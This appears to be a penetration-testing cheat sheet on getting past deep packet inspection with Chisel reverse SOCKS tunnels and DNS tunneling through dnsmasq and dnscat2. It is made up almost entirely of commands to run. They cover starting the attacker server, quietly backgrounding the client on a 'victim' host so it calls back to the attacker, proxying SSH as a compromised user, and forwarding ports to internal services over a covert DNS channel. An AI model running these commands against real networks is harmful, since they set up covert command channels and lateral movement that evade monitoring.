# Tunneling Through Deep Packet Inspection

## Chisel

Run a Chisel server on Kali:
```
chiselkali$ chisel server --port $KaliPort --reverse
```
then monitor the traffic in case it doesn't work:
```
chiselkali$ sudo tcpdump -nvvvXi $SomeInterface tcp port $KaliPort
```
Send the Chiser client to the target and execute it:
```
victim$ chisel client $IpChiselKali:$KaliPort R:socks > /dev/null 2>&1 &
```
Check the opened port on Kali to reuse it:
```
chiselkali$ ss -lntpu # check port for the Socks proxy
```
and use the port to send Socks command (`nc` doesn't support proxying, instead run `ncat`):
```
kali$ sudo apt-get install ncat
kali$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$PortCheckedWithSs %h %p' hackeduser@$IpDbIn
```

## DNS

### Dnsmasq settings and Nslookup check

Run Dnsmasq and load a conf file:
```
sudo dnsmasq -C dnsmasq.conf -d
```
Listen on the interface to check:
```
sudo tcpdump -i ensXpY udp port 53
```
and test the name resolution on another station:
```
resolvectl status # check the DNS server
nslookup somesubzone.mydnsserver.com $victiminternaldns
```

### Dnscat2

Run a DNS server on Kali:
```
dnskali$ dnscat2-server mytld.com
```
and start `dnscat` on the target:
```
victim$ ./dnscat mytld.com
```
In the Dnscat2 shell, open a port in the target:
```
dnscat2> windows # with an 's'
dnscat2> window -i 1 # without 's'
command> ?
command> listen 127.0.0.1:$AttackerPort $IpDeepIn:$PortService
```
and connect from Kali:
```
dnskali$ someservice localhost:$PortService
```
